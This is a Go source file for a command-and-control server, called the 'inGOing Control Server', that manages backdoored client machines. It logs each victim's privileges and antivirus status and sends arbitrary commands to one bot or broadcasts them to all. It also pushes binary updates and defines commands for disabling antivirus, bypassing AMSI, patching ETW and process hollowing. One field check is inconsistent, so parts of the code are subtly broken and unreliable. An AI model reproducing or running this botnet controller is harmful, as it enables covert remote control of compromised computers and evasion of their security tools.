package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

const (
	ServerPort = "443"           // HTTPS port for secure communication
	SecretKey  = "magic_key_123" // Authentication key for client validation
	Timeout    = 30 * time.Second // Connection timeout
	CertFile   = "server.crt"    // TLS certificate file
	KeyFile    = "server.key"    // TLS private key file
	
	// Command constants for antivirus management
	CMD_DISABLE_AV     = "disable_av"      // Command to disable antivirus
	CMD_BYPASS_AV      = "bypass_av"       // Command to bypass antivirus
	CMD_INJECT_PROCESS = "inject_process"  // Command for process injection
	CMD_HOLLOW_PROCESS = "hollow_process"  // Command for process hollowing
	CMD_PATCH_ETW      = "patch_etw"       // Command to patch ETW
	CMD_BYPASS_AMSI    = "bypass_amsi"     // Command to bypass AMSI
)

// Color constants based on OS
var (
	colorReset  = ""
	colorRed    = ""
	colorGreen  = ""
	colorYellow = ""
	colorBlue   = ""
	colorPurple = ""
	colorCyan   = ""
	colorWhite  = ""
	isWindows   = runtime.GOOS == "windows"
)

func init() {
	if !isWindows {
		colorReset  = "\033[0m"
		colorRed    = "\033[31m"
		colorGreen  = "\033[32m"
		colorYellow = "\033[33m"
		colorBlue   = "\033[34m"
		colorPurple = "\033[35m"
		colorCyan   = "\033[36m"
		colorWhite  = "\033[37m"
	}
}

// Structure for storing client information
type Backdoor struct {
	ID         string    // Unique client identifier
	Conn       net.Conn  // Network connection
	Privileges string    // Current privilege level
	Version    string    // Client version
	LastSeen   time.Time // Last activity timestamp
	OS         string    // Operating system
	Arch       string    // Architecture
	IsAdmin    bool      // Administrative privileges flag
	HasUAC     bool      // UAC status (Windows)
	CanElevate bool      // Privilege escalation possibility
	AVStatus   string    // Antivirus status
	Protection []string  // Active protection mechanisms
	IsDebug    bool      // Debug mode flag
}

var (
	activeBots = make(map[string]*Backdoor) // Map of active connections
	mutex      = &sync.Mutex{}              // Mutex for thread-safe access
	currentVersion = "1.0.0"                // Current server version
	binaryChecksum = ""                     // Client binary checksum
	updateURL = "https://example.com/client/latest" // Update server URL
	connectionAttempts = make(map[string]time.Time)    // Track connection attempts per IP
	failedAttempts = make(map[string]int)             // Track failed authentication attempts
)

// Function for TLS configuration setup
func setupTLS() (*tls.Config, error) {
	// Load certificate and private key
	cert, err := tls.LoadX509KeyPair(CertFile, KeyFile)
	if err != nil {
		return nil, fmt.Errorf("error loading certificates: %v", err)
	}

	// Configure TLS with modern security settings
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:  tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}, nil
}

// Function for validating incoming connections
func validateConnection(conn net.Conn) bool {
	// Extract client IP address
	remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
	
	// List of suspicious IP ranges to block
	suspiciousIPs := []string{
		"0.0.0.0/8",      // Current network
		"10.0.0.0/8",     // Private network
		"100.64.0.0/10",  // Carrier-grade NAT
		"127.0.0.0/8",    // Loopback
		"169.254.0.0/16", // Link-local
		"172.16.0.0/12",  // Private network
		"192.0.0.0/24",   // IETF Protocol
		"192.0.2.0/24",   // TEST-NET-1
		"192.88.99.0/24", // 6to4 Relay
		"192.168.0.0/16", // Private network
		"198.18.0.0/15",  // Network benchmark
		"198.51.100.0/24",// TEST-NET-2
		"203.0.113.0/24", // TEST-NET-3
		"224.0.0.0/4",    // Multicast
		"240.0.0.0/4",    // Reserved
		"255.255.255.255/32", // Broadcast
	}
	
	// Parse remote IP
	ip := net.ParseIP(remoteIP)
	if ip == nil {
		fmt.Printf("Invalid IP address format: %s\n", remoteIP)
		return false
	}
	
	// Check against suspicious ranges
	for _, cidr := range suspiciousIPs {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if ipNet.Contains(ip) {
			fmt.Printf("Connection from suspicious IP range (%s): %s\n", cidr, remoteIP)
			return false
		}
	}
	
	// Rate limiting per IP
	mutex.Lock()
	defer mutex.Unlock()
	
	// Clean up old entries
	now := time.Now()
	for ip, lastConn := range connectionAttempts {
		if now.Sub(lastConn) > time.Hour {
			delete(connectionAttempts, ip)
			delete(failedAttempts, ip)
		}
	}
	
	// Check connection rate
	if lastConn, exists := connectionAttempts[remoteIP]; exists {
		if now.Sub(lastConn) < time.Minute {
			fmt.Printf("Connection rate limit exceeded for %s\n", remoteIP)
			return false
		}
	}
	
	// Check failed attempts
	if attempts, exists := failedAttempts[remoteIP]; exists && attempts >= 5 {
		fmt.Printf("Too many failed attempts from %s\n", remoteIP)
		return false
	}
	
	connectionAttempts[remoteIP] = now
	return true
}

// Data obfuscation using base64 encoding
func obfuscate(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// Data deobfuscation from base64
func deobfuscate(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// Calculate SHA-256 checksum of a file
func calculateChecksum(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hash.Sum(nil)), nil
}

// Main function for handling client connections
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set initial connection timeout
	conn.SetDeadline(time.Now().Add(Timeout))

	// Limit read buffer size
	reader := bufio.NewReaderSize(conn, 4096)
	
	// Authenticate client
	key, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("Authentication error: %v\n", err)
		return
	}

	// Update timeout after successful read
	conn.SetDeadline(time.Now().Add(Timeout))

	// Validate authentication key
	if deobfuscate(strings.TrimSpace(key)) != SecretKey {
		fmt.Println("Invalid authentication key")
		return
	}

	// Receive and parse system information
	sysInfo, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("System info error: %v\n", err)
		return
	}
	
	// Update timeout
	conn.SetDeadline(time.Now().Add(Timeout))

	sysInfo = strings.TrimSpace(deobfuscate(sysInfo))
	parts := strings.Split(sysInfo, "|")
	if len(parts) != 7 {
		fmt.Printf("Invalid system info format\n")
		return
	}

	// Create new client structure
	backdoor := &Backdoor{
		ID:         conn.RemoteAddr().String(),
		Conn:       conn,
		Privileges: parts[0],
		OS:         parts[1],
		Arch:       parts[2],
		IsAdmin:    parts[3] == "true",
		HasUAC:     parts[6] == "true",
		CanElevate: parts[5] == "true",
		Version:    currentVersion,
		LastSeen:   time.Now(),
		AVStatus:   parts[4],
		Protection: strings.Split(parts[7], ","),
		IsDebug:    false,
	}

	// Check maximum connections
	mutex.Lock()
	if len(activeBots) >= 100 { // Limit to 100 concurrent connections
		mutex.Unlock()
		fmt.Printf("Maximum connections reached, rejecting %s\n", backdoor.ID)
		return
	}
	activeBots[backdoor.ID] = backdoor
	mutex.Unlock()

	fmt.Printf("[+] New client connected: %s (OS: %s/%s, Privileges: %s, UAC: %v)\n",
		backdoor.ID, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.HasUAC)

	// Main command handling loop
	for {
		// Update timeout before each read
		conn.SetDeadline(time.Now().Add(Timeout))
		
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		command = strings.TrimSpace(deobfuscate(command))
		
		// Handle special commands
		switch {
		case strings.HasPrefix(command, "check_update:"):
			if err := handleUpdateCheck(backdoor, command); err != nil {
				fmt.Printf("Update check error for %s: %v\n", backdoor.ID, err)
			}
			
		case command == "get_checksum":
			if err := handleChecksumRequest(backdoor); err != nil {
				fmt.Printf("Checksum error for %s: %v\n", backdoor.ID, err)
			}
			
		case command == "get_binary":
			if err := handleBinaryRequest(backdoor); err != nil {
				fmt.Printf("Binary request error for %s: %v\n", backdoor.ID, err)
			}
			
		case command == "heartbeat":
			if err := handleHeartbeat(backdoor); err != nil {
				fmt.Printf("Heartbeat error for %s: %v\n", backdoor.ID, err)
			}
			
		default:
			if err := handleCommand(backdoor, command); err != nil {
				fmt.Printf("Command error for %s: %v\n", backdoor.ID, err)
			}
		}

		// Update last activity timestamp
		backdoor.LastSeen = time.Now()
	}

	// Remove disconnected client
	mutex.Lock()
	delete(activeBots, backdoor.ID)
	mutex.Unlock()
	fmt.Printf("[-] Client disconnected: %s\n", backdoor.ID)
}

// Command handlers for various client requests

// Handle version check and update notification
func handleUpdateCheck(b *Backdoor, command string) error {
	version := strings.TrimPrefix(command, "check_update:")
	if version < currentVersion {
		b.Conn.Write([]byte(obfuscate(fmt.Sprintf("%s:%s:%s\n",
			currentVersion, binaryChecksum, updateURL))))
		return nil
	} else {
		b.Conn.Write([]byte(obfuscate("no_update\n")))
		return nil
	}
}

// Handle checksum verification request
func handleChecksumRequest(b *Backdoor) error {
	b.Conn.Write([]byte(obfuscate(binaryChecksum + "\n")))
	return nil
}

// Handle binary download request
func handleBinaryRequest(b *Backdoor) error {
	b.Conn.Write([]byte(obfuscate(updateURL + "\n")))
	return nil
}

// Handle client heartbeat
func handleHeartbeat(b *Backdoor) error {
	b.LastSeen = time.Now()
	b.Conn.Write([]byte(obfuscate("ok\n")))
	return nil
}

// Handle general command execution
func handleCommand(b *Backdoor, command string) error {
	// Log command execution
	fmt.Printf("[%s] Executing command: %s\n", b.ID, command)
	
	// Send command to client
	b.Conn.Write([]byte(obfuscate(command + "\n")))
	
	// Receive command result
	reader := bufio.NewReader(b.Conn)
	result, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[Error getting result from %s]: %v\n", b.ID, err)
		return err
	}
	
	fmt.Printf("[Result from %s]:\n%s\n", b.ID, deobfuscate(strings.TrimSpace(result)))
	return nil
}

// Monitor active clients and remove inactive ones
func monitorBackdoors() {
	for {
		time.Sleep(60 * time.Second)
		now := time.Now()
		
		mutex.Lock()
		for id, backdoor := range activeBots {
			if now.Sub(backdoor.LastSeen) > 5*time.Minute {
				fmt.Printf("[!] Client %s not responding, removing\n", id)
				backdoor.Conn.Close()
				delete(activeBots, id)
			}
		}
		mutex.Unlock()
	}
}

// Menu structure
type MenuItem struct {
	id          string
	name        string
	description string
	handler     func()
	category    string
}

// Menu categories
var menuCategories = []string{
	"Clients",
	"Commands",
	"Debug",
	"System",
	"Help",
}

// Menu items
var menuItems []MenuItem

// Initialize menu items
func initializeMenu() {
	menuItems = []MenuItem{
		// Clients category
		{
			id:          "1",
			name:        "List Clients",
			description: "Show all connected clients",
			handler:     listClients,
			category:    "Clients",
		},
		{
			id:          "2",
			name:        "Client Details",
			description: "Show detailed information about a specific client",
			handler:     showClientDetails,
			category:    "Clients",
		},
		
		// Commands category
		{
			id:          "3",
			name:        "Send Command",
			description: "Send command to a specific client",
			handler:     sendCommand,
			category:    "Commands",
		},
		{
			id:          "4",
			name:        "Broadcast",
			description: "Send command to all clients",
			handler:     broadcastCommand,
			category:    "Commands",
		},
		
		// Debug category
		{
			id:          "5",
			name:        "Debug Clients",
			description: "List all debug mode clients",
			handler:     listDebugClients,
			category:    "Debug",
		},
		{
			id:          "6",
			name:        "Debug Logs",
			description: "View debug session logs",
			handler:     viewDebugLogs,
			category:    "Debug",
		},
		
		// System category
		{
			id:          "7",
			name:        "Server Status",
			description: "Show server status and statistics",
			handler:     showServerStatus,
			category:    "System",
		},
		{
			id:          "8",
			name:        "Update Settings",
			description: "Configure update server settings",
			handler:     updateSettings,
			category:    "System",
		},
		
		// Help category
		{
			id:          "9",
			name:        "Help",
			description: "Show help information",
			handler:     showHelp,
			category:    "Help",
		},
		{
			id:          "0",
			name:        "Exit",
			description: "Exit the server",
			handler:     exitServer,
			category:    "Help",
		},
	}
}

// Format text for output
func formatText(text string, color string) string {
	if isWindows {
		return text
	}
	return color + text + colorReset
}

// Show main menu
func showMenu() {
	for {
		clearScreen()
		printBanner()
		
		// Show active clients count
		mutex.Lock()
		activeCount := len(activeBots)
		debugCount := countDebugClients()
		mutex.Unlock()
		
		fmt.Printf("\n%s\n", formatText(fmt.Sprintf("Active Clients: %d | Debug Clients: %d", 
			activeCount, debugCount), colorGreen))
		
		// Print menu by categories
		for _, category := range menuCategories {
			fmt.Printf("%s\n", formatText(fmt.Sprintf("=== %s ===", category), colorYellow))
			for _, item := range menuItems {
				if item.category == category {
					fmt.Printf("%s %s - %s\n",
						formatText(fmt.Sprintf("[%s]", item.id), colorCyan),
						item.name, item.description)
				}
			}
			if category != "Help" {
				fmt.Println()
			}
		}
		
		// Get user input
		fmt.Printf("\n%s ", formatText("Select an option:", colorGreen))
		var choice string
		fmt.Scanln(&choice)
		
		// Handle choice
		for _, item := range menuItems {
			if item.id == choice {
				item.handler()
				break
			}
		}
	}
}

// Clear screen
func clearScreen() {
	if isWindows {
		cmd := exec.Command("cmd", "/c", "cls")
		cmd.Stdout = os.Stdout
		cmd.Run()
	} else {
		fmt.Print("\033[H\033[2J")
	}
}

// Print banner
func printBanner() {
	banner := `
██╗███╗   ██╗ ██████╗  ██████╗ ██╗███╗   ██╗ ██████╗ 
██║████╗  ██║██╔════╝ ██╔═══██╗██║████╗  ██║██╔════╝ 
██║██╔██╗ ██║██║  ███╗██║   ██║██║██╔██╗ ██║██║  ███╗
██║██║╚██╗██║██║   ██║██║   ██║██║██║╚██╗██║██║   ██║
██║██║ ╚████║╚██████╔╝╚██████╔╝██║██║ ╚████║╚██████╔╝
╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                      Control Server v1.0
`
	fmt.Print(formatText(banner, colorCyan))
}

// Count debug clients
func countDebugClients() int {
	count := 0
	for _, bot := range activeBots {
		if bot.IsDebug {
			count++
		}
	}
	return count
}

// Menu handlers
func listClients() {
	clearScreen()
	fmt.Printf("%s\n\n", formatText("=== Connected Clients ===", colorYellow))
	
	mutex.Lock()
	defer mutex.Unlock()
	
	if len(activeBots) == 0 {
		fmt.Printf("%s\n", formatText("No clients connected", colorRed))
	} else {
		for id, bot := range activeBots {
			fmt.Printf("%s\n", formatText(fmt.Sprintf("[%s]", id), colorCyan))
			fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
			fmt.Printf("  Privileges: %s (Admin: %v, UAC: %v)\n", 
				bot.Privileges, bot.IsAdmin, bot.HasUAC)
			fmt.Printf("  Version: %s\n", bot.Version)
			fmt.Printf("  Last Seen: %s\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
			fmt.Printf("  Debug Mode: %v\n\n", bot.IsDebug)
		}
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func showClientDetails() {
	clearScreen()
	fmt.Printf("%s=== Client Details ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Enter client ID: ")
	var id string
	fmt.Scanln(&id)
	
	mutex.Lock()
	bot, exists := activeBots[id]
	mutex.Unlock()
	
	if !exists {
		fmt.Printf("%sClient not found%s\n", colorRed, colorReset)
	} else {
		fmt.Printf("%sClient Information:%s\n", colorGreen, colorReset)
		fmt.Printf("  ID: %s\n", bot.ID)
		fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
		fmt.Printf("  Privileges: %s\n", bot.Privileges)
		fmt.Printf("  Admin: %v\n", bot.IsAdmin)
		fmt.Printf("  UAC: %v\n", bot.HasUAC)
		fmt.Printf("  Can Elevate: %v\n", bot.CanElevate)
		fmt.Printf("  Version: %s\n", bot.Version)
		fmt.Printf("  Last Seen: %s\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
		fmt.Printf("  Debug Mode: %v\n", bot.IsDebug)
		fmt.Printf("  AV Status: %s\n", bot.AVStatus)
		fmt.Printf("  Protection: %v\n", bot.Protection)
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func sendCommand() {
	clearScreen()
	fmt.Printf("%s=== Send Command ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Enter client ID (or 'all' for broadcast): ")
	var id string
	fmt.Scanln(&id)
	
	fmt.Printf("Enter command: ")
	command, _ := bufio.NewReader(os.Stdin).ReadString('\n')
	command = strings.TrimSpace(command)
	
	mutex.Lock()
	defer mutex.Unlock()
	
	if id == "all" {
		for _, bot := range activeBots {
			bot.Conn.Write([]byte(obfuscate(command + "\n")))
		}
		fmt.Printf("%sCommand broadcast to all clients%s\n", colorGreen, colorReset)
	} else {
		if bot, exists := activeBots[id]; exists {
			bot.Conn.Write([]byte(obfuscate(command + "\n")))
			fmt.Printf("%sCommand sent to client %s%s\n", colorGreen, id, colorReset)
		} else {
			fmt.Printf("%sClient not found%s\n", colorRed, colorReset)
		}
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func broadcastCommand() {
	clearScreen()
	fmt.Printf("%s=== Broadcast Command ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Enter command to broadcast: ")
	command, _ := bufio.NewReader(os.Stdin).ReadString('\n')
	command = strings.TrimSpace(command)
	
	mutex.Lock()
	for _, bot := range activeBots {
		bot.Conn.Write([]byte(obfuscate(command + "\n")))
	}
	mutex.Unlock()
	
	fmt.Printf("%sCommand broadcast to all clients%s\n", colorGreen, colorReset)
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func listDebugClients() {
	clearScreen()
	fmt.Printf("%s=== Debug Clients ===%s\n\n", colorYellow, colorReset)
	
	mutex.Lock()
	defer mutex.Unlock()
	
	debugFound := false
	for id, bot := range activeBots {
		if bot.IsDebug {
			debugFound = true
			fmt.Printf("%s[DEBUG] Client: %s%s\n", colorCyan, id, colorReset)
			fmt.Printf("  OS: %s/%s\n", bot.OS, bot.Arch)
			fmt.Printf("  Privileges: %s\n", bot.Privileges)
			fmt.Printf("  Last Seen: %s\n\n", bot.LastSeen.Format("2006-01-02 15:04:05"))
		}
	}
	
	if !debugFound {
		fmt.Printf("%sNo debug clients connected%s\n", colorRed, colorReset)
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func viewDebugLogs() {
	clearScreen()
	fmt.Printf("%s=== Debug Logs ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Enter client ID: ")
	var id string
	fmt.Scanln(&id)
	
	mutex.Lock()
	bot, exists := activeBots[id]
	mutex.Unlock()
	
	if !exists || !bot.IsDebug {
		fmt.Printf("%sDebug client not found%s\n", colorRed, colorReset)
	} else {
		fmt.Printf("%sDebug logs for client %s:%s\n\n", colorGreen, id, colorReset)
		// Here you would implement debug log viewing logic
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func showServerStatus() {
	clearScreen()
	fmt.Printf("%s=== Server Status ===%s\n\n", colorYellow, colorReset)
	
	mutex.Lock()
	totalClients := len(activeBots)
	debugClients := countDebugClients()
	mutex.Unlock()
	
	fmt.Printf("Server Version: %s\n", currentVersion)
	fmt.Printf("Active Clients: %d\n", totalClients)
	fmt.Printf("Debug Clients: %d\n", debugClients)
	fmt.Printf("Binary Checksum: %s\n", binaryChecksum)
	fmt.Printf("Update URL: %s\n", updateURL)
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func updateSettings() {
	clearScreen()
	fmt.Printf("%s=== Update Settings ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Current Settings:\n")
	fmt.Printf("1. Version: %s\n", currentVersion)
	fmt.Printf("2. Update URL: %s\n", updateURL)
	fmt.Printf("3. Binary Checksum: %s\n\n", binaryChecksum)
	
	fmt.Printf("Select setting to change (1-3): ")
	var choice string
	fmt.Scanln(&choice)
	
	switch choice {
	case "1":
		fmt.Printf("Enter new version: ")
		fmt.Scanln(&currentVersion)
	case "2":
		fmt.Printf("Enter new update URL: ")
		fmt.Scanln(&updateURL)
	case "3":
		fmt.Printf("Enter new binary checksum: ")
		fmt.Scanln(&binaryChecksum)
	default:
		fmt.Printf("%sInvalid choice%s\n", colorRed, colorReset)
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func showHelp() {
	clearScreen()
	fmt.Printf("%s=== Help Information ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Available Commands:\n\n")
	for _, category := range menuCategories {
		fmt.Printf("%s=== %s ===%s\n", colorCyan, category, colorReset)
		for _, item := range menuItems {
			if item.category == category {
				fmt.Printf("%s[%s]%s %s - %s\n",
					colorGreen, item.id, colorReset,
					item.name, item.description)
			}
		}
		fmt.Println()
	}
	
	fmt.Printf("\nPress Enter to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func exitServer() {
	clearScreen()
	fmt.Printf("%s=== Exiting Server ===%s\n\n", colorYellow, colorReset)
	
	fmt.Printf("Are you sure you want to exit? (y/n): ")
	var choice string
	fmt.Scanln(&choice)
	
	if strings.ToLower(choice) == "y" {
		fmt.Printf("%sShutting down server...%s\n", colorRed, colorReset)
		os.Exit(0)
	}
}

// Generate self-signed certificates
func generateCertificates() error {
	fmt.Printf("%s[*] Generating self-signed certificates...%s\n", colorYellow, colorReset)
	
	// Generate private key
	cmd := exec.Command("openssl", "req", "-x509", "-newkey", "rsa:4096", 
		"-keyout", KeyFile, 
		"-out", CertFile, 
		"-days", "365", 
		"-nodes",
		"-subj", "/CN=localhost")
	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to generate certificates: %v\nOutput: %s", err, string(output))
	}
	
	fmt.Printf("%s[+] Certificates generated successfully%s\n", colorGreen, colorReset)
	return nil
}

// Main server function
func main() {
	var err error
	
	// Initialize menu
	initializeMenu()
	
	// Print startup banner
	clearScreen()
	printBanner()
	fmt.Printf("%s[*] Starting inGOing Control Server...%s\n", colorGreen, colorReset)

	// Check and generate certificates if needed
	if _, err = os.Stat(CertFile); os.IsNotExist(err) {
		if _, err = os.Stat(KeyFile); os.IsNotExist(err) {
			fmt.Printf("%s[!] Certificate files not found, generating new ones...%s\n", colorYellow, colorReset)
			if err = generateCertificates(); err != nil {
				fmt.Printf("%s[!] Error generating certificates: %v%s\n", colorRed, err, colorReset)
				fmt.Printf("\nPress Enter to exit...")
				bufio.NewReader(os.Stdin).ReadBytes('\n')
				return
			}
		}
	}
	fmt.Printf("%s[+] Certificate files found%s\n", colorGreen, colorReset)

	// Initialize TLS configuration
	fmt.Printf("%s[*] Initializing TLS configuration...%s\n", colorYellow, colorReset)
	tlsConfig, err := setupTLS()
	if err != nil {
		fmt.Printf("%s[!] Error setting up TLS: %v%s\n", colorRed, err, colorReset)
		fmt.Printf("\nPress Enter to exit...")
		bufio.NewReader(os.Stdin).ReadBytes('\n')
		return
	}
	fmt.Printf("%s[+] TLS configuration initialized%s\n", colorGreen, colorReset)

	// Start TLS server
	fmt.Printf("%s[*] Starting server on port %s...%s\n", colorYellow, ServerPort, colorReset)
	listener, err := tls.Listen("tcp", ":"+ServerPort, tlsConfig)
	if err != nil {
		fmt.Printf("%s[!] Error starting server: %v%s\n", colorRed, err, colorReset)
		fmt.Printf("\nPress Enter to exit...")
		bufio.NewReader(os.Stdin).ReadBytes('\n')
		return
	}
	defer listener.Close()
	fmt.Printf("%s[+] Server started successfully%s\n", colorGreen, colorReset)

	// Start client monitoring
	fmt.Printf("%s[*] Starting client monitor...%s\n", colorYellow, colorReset)
	go monitorBackdoors()
	fmt.Printf("%s[+] Client monitor started%s\n", colorGreen, colorReset)

	// Handle incoming connections
	fmt.Printf("%s[*] Starting connection handler...%s\n", colorYellow, colorReset)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Printf("%s[!] Connection error: %v%s\n", colorRed, err, colorReset)
				continue
			}

			// Validate incoming connection
			if !validateConnection(conn) {
				fmt.Printf("%s[!] Suspicious connection from %s rejected%s\n", 
					colorRed, conn.RemoteAddr(), colorReset)
				conn.Close()
				continue
			}

			go handleConnection(conn)
		}
	}()
	fmt.Printf("%s[+] Connection handler started%s\n", colorGreen, colorReset)

	// Small delay to show startup messages
	time.Sleep(1 * time.Second)

	// Start menu
	fmt.Printf("%s[*] Initializing control menu...%s\n", colorYellow, colorReset)
	showMenu()
}